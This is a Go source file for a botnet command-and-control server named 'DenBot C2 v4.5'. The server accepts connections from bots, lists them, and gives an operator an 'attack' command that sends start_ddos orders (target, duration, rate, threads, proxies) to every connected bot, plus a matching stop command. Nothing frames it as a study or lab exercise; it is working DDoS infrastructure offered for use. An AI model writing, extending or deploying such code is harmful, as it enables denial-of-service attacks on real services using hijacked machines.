package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	port   = flag.Int("port", 4444, "C2 port")
	secret = flag.String("secret", "foxden2026", "shared secret")
)

type Command struct {
	Action   string   `json:"action"`
	Target   string   `json:"target"`
	Duration int      `json:"duration"`
	Rate     int      `json:"rate"`
	Threads  int      `json:"threads"`
	Proxies  []string `json:"proxies"`
	AttackID string   `json:"attack_id"`
	Cmd      string   `json:"cmd"`
}

type BotInfo struct {
	ID       string
	OS       string
	IP       string
	LastSeen time.Time
	Status   string
	Conn     net.Conn
	Version  string
}

var (
	bots   = make(map[string]*BotInfo)
	botsMu sync.Mutex
)

func main() {
	flag.Parse()
	fmt.Println("╔════════════════════════════════════════════╗")
	fmt.Println("║          DenBot C2 v4.5                    ║")
	fmt.Println("╚════════════════════════════════════════════╝")

	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		panic(err)
	}
	go cliLoop()

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleBot(conn)
	}
}

func handleBot(conn net.Conn) {
	defer conn.Close()
	decoder := json.NewDecoder(conn)

	var reg struct {
		ID      string `json:"id"`
		OS      string `json:"os"`
		IP      string `json:"ip"`
		Version string `json:"version"`
	}
	if err := decoder.Decode(&reg); err != nil {
		return
	}

	bot := &BotInfo{
		ID:       reg.ID,
		OS:       reg.OS,
		IP:       reg.IP,
		LastSeen: time.Now(),
		Status:   "idle",
		Conn:     conn,
		Version:  reg.Version,
	}

	botsMu.Lock()
	bots[bot.ID] = bot
	botsMu.Unlock()

	fmt.Printf("[+] Bot connected: %s (%s) v%s from %s\n", bot.ID, bot.OS, bot.Version, bot.IP)

	for {
		var msg map[string]interface{}
		if err := decoder.Decode(&msg); err != nil {
			break
		}
	}
}

func cliLoop() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("c2> ")
		line, _ := reader.ReadString('\n')
		parts := strings.Fields(strings.TrimSpace(line))
		if len(parts) == 0 {
			continue
		}
		switch parts[0] {
		case "bots":
			botsMu.Lock()
			for id, b := range bots {
				fmt.Printf("%s | %s | %s | v%s | %s\n", id, b.OS, b.IP, b.Version, b.Status)
			}
			botsMu.Unlock()
		case "attack":
			if len(parts) < 6 {
				fmt.Println("attack all <target> <sec> <rate> <threads> [proxies...]")
				continue
			}
			atkID := fmt.Sprintf("atk_%d", time.Now().Unix())
			cmd := Command{
				Action:   "start_ddos",
				Target:   parts[2],
				Duration: atoi(parts[3]),
				Rate:     atoi(parts[4]),
				Threads:  atoi(parts[5]),
				Proxies:  parts[6:],
				AttackID: atkID,
			}
			broadcast(cmd)
			fmt.Printf("[+] Attack %s started\n", atkID)
		case "stop":
			if len(parts) > 1 {
				broadcast(Command{Action: "stop_ddos", AttackID: parts[1]})
			}
		case "exit":
			os.Exit(0)
		}
	}
}

func broadcast(cmd Command) {
	botsMu.Lock()
	defer botsMu.Unlock()
	for _, b := range bots {
		json.NewEncoder(b.Conn).Encode(cmd)
	}
}

func atoi(s string) int {
	i, _ := strconv.Atoi(s)
	return i
}
